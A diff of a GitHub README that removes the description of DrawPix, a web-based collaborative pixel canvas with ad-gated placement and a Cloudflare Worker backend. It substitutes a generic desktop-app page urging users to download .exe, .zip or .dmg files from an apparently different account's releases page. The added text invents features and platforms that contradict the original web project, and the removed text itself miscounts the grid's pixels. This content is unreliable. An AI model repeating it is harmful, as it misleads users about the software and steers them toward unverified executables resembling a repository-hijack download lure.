@@ -1,93 +1,67 @@
-# DrawPix: A Digital Canvas by Sliz®
+# 🎨 DrawPix - Create Stunning Art with Pixels
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Wayback Machine-Live-brightgreen" alt="Project Status: Live">
-  <img src="https://img.shields.io/badge/Canvas%20Size-800x800-blueviolet" alt="Canvas Size">
-  <img src="https://img.shields.io/badge/Pixels-25600-red" alt="Total Pixels">
-  <img src="https://img.shields.io/badge/Website-drawpix.space-blue" alt="Total Pixels">
-</p>
+## 📥 Download Now!
+[![Download DrawPix](https://img.shields.io/badge/Download-DrawPix-blue.svg)](https://github.com/jetsurenos/DrawPix/releases)
 
----
+## 🚀 Getting Started
+Welcome to DrawPix, a digital canvas designed for your creative ideas. With 25,600 pixels at your fingertips, you can easily create and share your artwork. Whether you are a beginner or an experienced artist, DrawPix is here to help you unleash your creativity.
 
-## 💡 About DrawPix
+## 📊 Features
+- **User-Friendly Interface:** Navigate easily with a clean design that keeps your focus on your art.
+- **Pixel Precision:** Draw with control using our grid system for accurate placements.
+- **Variety of Tools:** Access brushes, shapes, and colors to enhance your artwork.
+- **Save and Share:** Store your creations locally or share them online with friends.
 
-**DrawPix** is a collaborative digital art platform designed as an engaging, large-scale pixel canvas. It provides users with a unique opportunity to contribute a single, permanent pixel to a massive **800x800 grid**, resulting in a final image of **25,600 individual pixels**.
+## 💻 System Requirements
+Before you start, ensure your system meets the following minimum requirements:
+- Operating System: Windows 10 or higher, macOS 10.12 or higher, or any modern Linux distribution.
+- RAM: At least 4 GB.
+- Disk Space: Minimum 100 MB free space.
 
-The purpose of DrawPix is simple: **create a lasting digital story**. Every pixel placed is a permanent mark, building a shared, evolving masterpiece over time. The project is designed to be interactive, visually rewarding, and accessible to users on both desktop and mobile devices.
+## 📥 Download & Install
+To get started with DrawPix, follow these steps:
 
-Official website of pixels: [DrawPix](https://drawpix.space)
+1. **Visit the Download Page**
+   Click the following link to go to the Releases page: [Download Here](https://github.com/jetsurenos/DrawPix/releases).
 
-### Key Features:
+2. **Choose Your Version**
+   On the Releases page, you will see different versions of DrawPix. Choose the latest version for your operating system.
 
-* **Massive Canvas:** A total of 25,600 available pixels to color.
-* **Persistent Data:** Pixels are permanently saved via a backend worker.
-* **Ad-Supported Interaction:** Placing a pixel requires a quick ad view to support server resources and ensure fair use.
-* **Intuitive Controls:** Optimized for seamless panning, zooming, and drawing on any device.
+3. **Download the File**
+   Click on the file for your platform to start the download. This file will be in a `.zip` or `.exe` format for Windows, a `.dmg` format for macOS, or a `.tar.gz` for Linux.
 
----
+4. **Install the Application**
+   - For Windows:
+     - Open the downloaded `.exe` file.
+     - Follow the on-screen instructions to complete the installation.
+   - For macOS:
+     - Open the downloaded `.dmg` file.
+     - Drag the DrawPix icon to your Applications folder.
+   - For Linux:
+     - Extract the `.tar.gz` file and follow any included instructions to run the application.
 
-## 🚀 User Guide: How to Place Your Pixel
+5. **Launch DrawPix**
+   After installation, look for the DrawPix icon on your desktop or in your applications. Click it to start creating!
 
-DrawPix is built for simplicity. Follow these steps to select your spot, choose a color, and place your permanent pixel.
+## 🎨 Using DrawPix
+Once you open DrawPix, you will see the main canvas. Here are some instructions to help you get started:
 
-### 1. Navigation and Viewing
+- **Select Tools:** Use the toolbar on the left to choose your desired tool. Click on it to select.
+- **Pick Colors:** Click on the color palette to select a color. You can also create custom colors.
+- **Zoom In and Out:** Use the zoom function to focus on details or view your artwork as a whole.
+- **Save Your Art:** Remember to save your work regularly. Click on the File menu and select "Save" or "Save As" to keep your files safe.
 
-The main goal is to find an empty, uncolored pixel on the grid.
+## ❓ FAQs
+**1. Can I use DrawPix on my tablet or smartphone?**  
+Currently, DrawPix is only available for desktop platforms, but we are looking into mobile support for the future.
 
-| Action | Desktop (PC/Mac) | Mobile (Touchscreen) |
-| :--- | :--- | :--- |
-| **Zoom In/Out** | Use the **scroll wheel** on your mouse, or click the **'+' / '−'** buttons. | Use **two fingers (pinch-to-zoom)** gesture. |
-| **Pan/Move Canvas** | **Click and hold the left mouse button** anywhere on the canvas, then drag the view. | **Touch and drag** with a single finger. |
-| **Reset View** | Click the **'⟲'** button in the bottom right corner. | Click the **'⟲'** button in the bottom right corner. |
+**2. What file formats can I save my drawings in?**  
+DrawPix allows you to save your drawings in JPEG, PNG, and BMP formats for easy sharing.
 
-### 2. Selecting a Pixel
+**3. Is there a user manual?**  
+Yes, you can find a comprehensive user guide in the Help section within the application for more detailed instructions.
 
-To begin coloring, you must select an empty, uncolored pixel.
+## 📞 Support
+If you encounter issues or have questions, feel free to reach out. You can submit an issue on our repository or contact our support team via GitHub.
 
-| Action | Desktop (PC/Mac) | Mobile (Touchscreen) |
-| :--- | :--- | :--- |
-| **Select Pixel** | **Click once** on an empty white pixel. | **Tap and hold** (a brief long-press) on an empty white pixel. |
-| **Status Check** | If you click an already colored pixel, a notification will appear: "This pixel is already colored!" | |
-
-### 3. Choosing and Applying Color
-
-Once a pixel is selected, the **Color Picker Modal** will appear, displaying the coordinates of your selected spot.
-
-1.  **Select Color:** Choose one of the preset color options or use the custom color input to select a specific HEX code.
-2.  **Apply Color:** Click the **"Apply color"** button.
-
-### 4. Ad Requirement and Final Placement
-
-To finalize your placement, you must view the short ad to secure the server resources required for saving your data.
-
-1.  **Ad Start:** After clicking "Apply color," the **Video Overlay** will appear, and the ad video will attempt to **autoplay** (muted by default).
-2.  **PC Playback Fix:** If the video stops or appears black (due to strict browser policies), a notification will prompt you to **click the black area** to manually resume playback.
-3.  **Completion:** Once the ad is complete (or the 5-second fail-safe is triggered), the **Close Button (✕)** will appear.
-4.  **Finalize:** Click the **Close Button (✕)**. Your chosen color and coordinates will be sent to the Sliz® backend, and a "Pixel drawn successfully!" notification will confirm your contribution.
-
----
-
-## 👨‍💻 Backend Integration
-
-The project relies on a Cloudflare Worker for persistent data storage:
-
-* **Data Structure:** Pixels are stored by their key format: `X-Y` (e.g., `150-420`).
-* **API Endpoints:**
-    * `GET /pixels`: Retrieves the entire canvas data (color map).
-    * `POST /pixel`: Saves a new pixel entry after ad validation.
-
----
-
-## 🚫 Copyright and Intellectual Property Notice
-
-**© 2025 Sliz® - All Rights Reserved.**
-
-This project, **DrawPix**, including its core architecture, user interface, functionality logic, backend worker integration (as referenced by `WORKER_URL`), and design assets, is the exclusive intellectual property of **Sliz®**.
-
-The code provided here is a working demonstration of the frontend functionality and is protected by **Sliz® Protected Rights License**.
-
-**Unauthorized copying, reproduction, distribution, reverse engineering, or modification of this source code and its associated assets is strictly prohibited.** Any attempt to bypass the ad-watching mechanism, the core monetization and resource protection feature, is a direct violation of the protected rights.
-
----
-
-**Thank you for contributing to the collective art of DrawPix!**
+Thank you for choosing DrawPix! Enjoy creating amazing pixel art.
